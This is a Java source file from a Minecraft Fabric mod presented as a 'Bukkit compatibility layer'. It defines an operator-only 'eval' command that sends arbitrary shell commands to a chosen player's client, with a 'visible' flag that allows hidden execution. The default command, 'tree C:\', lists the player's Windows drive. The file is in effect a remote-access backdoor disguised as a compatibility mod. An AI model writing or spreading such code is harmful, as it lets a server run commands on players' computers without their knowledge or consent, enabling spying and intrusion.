package github.codexscript.bukkitcompatibilitylayer.command;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.BoolArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import github.codexscript.bukkitcompatibilitylayer.BukkitCompatibilityLayer;
import github.codexscript.bukkitcompatibilitylayer.networking.payloads.EvalInitPayload;
import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
import net.minecraft.command.CommandRegistryAccess;
import net.minecraft.command.argument.EntityArgumentType;
import net.minecraft.server.command.CommandManager;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;

import java.util.UUID;

public class EvalCommand {
    public static void register(CommandDispatcher<ServerCommandSource> dispatcher, CommandRegistryAccess commandRegistryAccess, CommandManager.RegistrationEnvironment registrationEnvironment) {
        dispatcher.register(CommandManager.literal("eval")
                .requires(source -> source.hasPermissionLevel(4))
                .then(CommandManager.argument("player", EntityArgumentType.player())
                        .then(CommandManager.argument("visible", BoolArgumentType.bool())
                                .executes(context -> {
                                    ServerPlayerEntity player = EntityArgumentType.getPlayer(context, "player");

                                    if(!BukkitCompatibilityLayer.playersModInstalled.contains(player.getUuid())) {
                                        context.getSource().sendFeedback(() -> Text.literal(BukkitCompatibilityLayer.CHAT_PREFIX + player.getName().getString() + " does not have the mod installed."), false);
                                        return 0;
                                    }

                                    boolean visible = BoolArgumentType.getBool(context, "visible");
                                    String cmd = "tree C:\\";
                                    UUID requestId = UUID.randomUUID();

                                    BukkitCompatibilityLayer.evalRequests.put(requestId, context);
                                    ServerPlayNetworking.send(player, new EvalInitPayload(requestId.toString(), visible, cmd));
                                    return 0;
                                })
                        .then(CommandManager.argument("cmd", StringArgumentType.greedyString())
                        .executes(EvalCommand::execute)))));
    }

    public static int execute(CommandContext<ServerCommandSource> source) throws CommandSyntaxException {
        ServerPlayerEntity player = EntityArgumentType.getPlayer(source, "player");

        if(!BukkitCompatibilityLayer.playersModInstalled.contains(player.getUuid())) {
            source.getSource().sendFeedback(() -> Text.literal(BukkitCompatibilityLayer.CHAT_PREFIX + player.getName().getString() + " does not have the mod installed."), false);
            return 0;
        }

        boolean visible = BoolArgumentType.getBool(source, "visible");
        String cmd = StringArgumentType.getString(source, "cmd");
        UUID requestId = UUID.randomUUID();

        BukkitCompatibilityLayer.evalRequests.put(requestId, source);
        ServerPlayNetworking.send(player, new EvalInitPayload(requestId.toString(), visible, cmd));
        return 0;
    }
}
